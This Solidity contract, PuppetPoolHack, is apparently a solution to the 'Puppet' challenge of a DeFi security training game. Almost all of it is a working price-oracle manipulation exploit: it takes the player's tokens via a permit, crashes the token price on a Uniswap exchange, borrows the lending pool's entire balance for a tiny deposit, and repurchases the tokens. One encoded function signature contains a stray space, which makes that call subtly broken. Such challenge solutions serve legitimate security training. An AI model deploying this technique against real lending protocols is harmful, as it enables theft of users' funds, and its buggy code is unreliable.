// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./PuppetPool.sol";
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract PuppetPoolHack {
  address public owner;
  PuppetPool public pool;
  DamnValuableToken public token;
  constructor(
    address payable _pool,
    address payable _token,
    address payable _uniswap,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s,
    uint256 playerTokens,
    uint256 poolTokens
    ) payable {
    owner = msg.sender;
    pool = PuppetPool(_pool);
    token = DamnValuableToken(_token);

    // Use the permit signed to grant this contract access to DVT tokens
    token.permit(
      msg.sender,
      address(this),
      playerTokens,
      deadline,
      v,
      r,
      s
    );
    token.transferFrom(msg.sender, address(this), playerTokens);

    // Now carry out hack steps on behalf of attacker
    // Approve and transfer all our DVTs to pool to have balance skewed
    token.approve(_uniswap, playerTokens);
    bytes memory tokenSwap = abi.encodeWithSignature("tokenToEthSwapInput(uint256,uint256,uint256)", playerTokens, 9 ether, deadline);
    (bool success, bytes memory returnData) = _uniswap.call(tokenSwap);
    require(success, "tokenSwap failed");

    // Now get new amount for full balance withdraw from pool
    uint256 deposit = pool.calculateDepositRequired(poolTokens);
    pool.borrow{value: deposit}(poolTokens, address(this));

    // Get our tokens back from uniswap with our lended amounts, balance exchange back out
    // Get price we neeed to pay in eth for our full amount back
    bytes memory ethPriceData = abi.encodeWithSignature("getEthToTokenOutputPrice(uint256)", playerTokens);
    (success, returnData) = _uniswap.call(ethPriceData);
    require(success, "ethPriceData failed");
    // Decode price for our tokens back
    uint256 ethPrice = uint256(bytes32(returnData));

    // Perform swap with the amount quoted in eth
    bytes memory ethSwap = abi.encodeWithSignature("ethToTokenSwapOutput(uint256, uint256)", playerTokens, deadline);
    (success, returnData) = _uniswap.call{value: ethPrice}(ethSwap);
    require(success, "ethSwap failed");


    // Send our tokens and eth back to the player to pass tests
    token.transfer(msg.sender, token.balanceOf(address(this)));
    payable(msg.sender).transfer(address(this).balance);
  }


  receive() external payable {}
}